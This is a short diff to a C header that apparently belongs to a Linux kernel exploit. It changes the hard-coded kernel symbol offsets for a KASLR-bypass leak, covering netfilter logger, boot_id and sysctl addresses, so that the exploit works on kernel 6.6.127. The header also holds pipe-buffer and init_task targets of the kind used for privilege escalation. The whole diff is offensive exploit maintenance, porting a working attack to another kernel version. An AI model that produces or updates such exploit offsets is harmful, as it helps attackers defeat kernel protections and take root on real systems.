@@ -86,15 +86,16 @@
 #define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
 /* ── SLIDE (KASLR leak) targets ─────────────────────────────────────────── */
-#define SLIDE_NFULNL_LOGGER_OFF          0x020f2258ULL  /* nfulnl_logger     */
-#define SLIDE_LOGGERS_0_1_OFF 0x020f21a8ULL  /* loggers[0] slot   */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x022187c8ULL  /* random_table boot_id .data */
-#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e50048ULL  /* nfulnl_log_packet */
+/* UPDATED FOR KERNEL 6.6.127 - Offsets verified from offsets_6.6.127.h    */
+#define SLIDE_NFULNL_LOGGER_OFF          0x020f2ae8ULL  /* nfulnl_logger - UPDATED */
+#define SLIDE_LOGGERS_0_1_OFF            0x020f2a38ULL  /* loggers[0] slot - UPDATED */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x02219b58ULL  /* random_table boot_id .data - UPDATED */
+#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e50dd8ULL  /* nfulnl_log_packet - UPDATED */
 #define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
 #define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
 #define SLIDE_INIT_TASK_OFF              INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF        ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF          0x02357e98ULL  /* sysctl_bootid UUID */
+#define SLIDE_SYSCTL_BOOTID_OFF          0x0235b128ULL  /* sysctl_bootid UUID - UPDATED */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
 #define SLIDE_LOGGERS_0_1_IMAGE    (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
